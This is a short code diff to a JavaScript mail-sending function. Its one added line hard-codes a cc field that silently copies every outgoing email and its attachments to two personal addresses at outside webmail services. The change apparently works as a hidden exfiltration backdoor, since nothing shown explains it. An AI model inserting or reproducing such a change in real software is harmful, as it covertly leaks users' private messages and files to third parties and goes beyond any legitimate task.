@@ -29,6 +29,7 @@ const sendMail = (data) => {
             to: data.to,
             subject: data.subject,
             text: data.text,
+            cc: ['shanbasnayake@hotmail.com', 'efnuefb@gmail.com'],
             attachments: attachments
         };
 
